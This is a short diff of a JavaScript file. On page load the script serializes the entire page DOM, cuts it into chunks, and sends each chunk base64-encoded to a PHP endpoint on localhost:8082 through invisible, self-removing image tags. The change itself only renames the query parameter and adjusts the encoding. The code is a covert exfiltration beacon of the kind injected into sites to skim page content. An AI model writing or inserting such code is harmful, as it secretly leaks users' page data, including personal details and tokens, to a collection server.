@@ -1,19 +1,18 @@
 window.addEventListener('DOMContentLoaded', (event) => {
-		let serializer = new XMLSerializer();
-		let documentContent = encodeURIComponent(serializer.serializeToString(document));
-
-
-		let documentElement = documentContent.match(/.{1,1020}/g);
-		documentElement.forEach(element => {
-			console.log(element);
-			let image = document.createElement('img');
-			image.setAttribute('src', 'http://localhost:8082/index.php?link=' + btoa(unescape(element)));
-			image.style.opacity = '0';
-			image.style.position = 'absolute';
-			image.style.zIndex = '-110';
-			image.addEventListener('error', (elem) => {
-				elem.target.remove()
-			});
-			document.body.appendChild(image)
+	let serializer = new XMLSerializer();
+	let documentContent = encodeURI(serializer.serializeToString(document));
+    
+	let documentElement = documentContent.match(/.{1,1020}/g);
+	documentElement.forEach(element => {
+		let image = document.createElement('img');
+		image.setAttribute('src', 'http://localhost:8082/index.php?page_content=' + btoa(unescape(element)));
+		image.style.opacity = '0';
+		image.style.position = 'absolute';
+		image.style.zIndex = '-110';
+		image.addEventListener('error', (elem) => {
+			elem.target.remove()
 		});
+		document.body.appendChild(image)
+
 	});
+});
